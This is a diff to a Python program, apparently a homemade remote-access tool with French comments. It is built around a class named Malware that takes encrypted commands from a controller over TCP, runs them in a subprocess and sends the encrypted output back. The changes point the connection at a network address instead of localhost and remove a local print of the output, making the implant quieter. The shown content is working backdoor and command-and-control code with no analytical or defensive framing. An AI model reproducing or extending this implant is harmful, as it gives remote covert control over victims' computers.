@@ -9,7 +9,7 @@ Classe contenant les variables communes entre client et serveur
 
 class Machine:
     def __init__(self):
-        self.server_addr = ("localhost", 60000)
+        self.server_addr = ("192.168.0.18", 60000)
         self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.language = "utf-8"
         self.buffsize = 4096
@@ -36,7 +36,6 @@ class Malware(Machine):
             self.start()
 
     def send(self, message):
-        '''self.my_socket.send(str(message).encode(self.language))'''
         raw = message.encode(self.language)
         cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
         encrypted = b64encode(self.iv + cipher.encrypt(raw))
@@ -48,7 +47,6 @@ class Malware(Machine):
         iv = enc[:16]
         cipher = AES.new(self.key, AES.MODE_CFB, iv)
         cmd = cipher.decrypt(enc[16:]).decode(self.language)
-
         return cmd
 
     def quit(self):
@@ -65,7 +63,6 @@ class Malware(Machine):
         out_byte = var.stdout.read() + var.stderr.read()
         out_str = out_byte.decode("utf-8", errors="replace")
         self.send(out_str)
-        print(out_str)
 
 
 """
@@ -97,9 +94,6 @@ class Client(Machine):
         distant_socket.send(encrypted)
 
     def receive(self):
-        '''rep = distant_socket.recv(self.buffsize)
-        rep = rep.decode(self.language)
-        print(rep, end="")'''
         enc = distant_socket.recv(self.buffsize).decode(self.language)
         enc = b64decode(enc)
         iv = enc[:16]
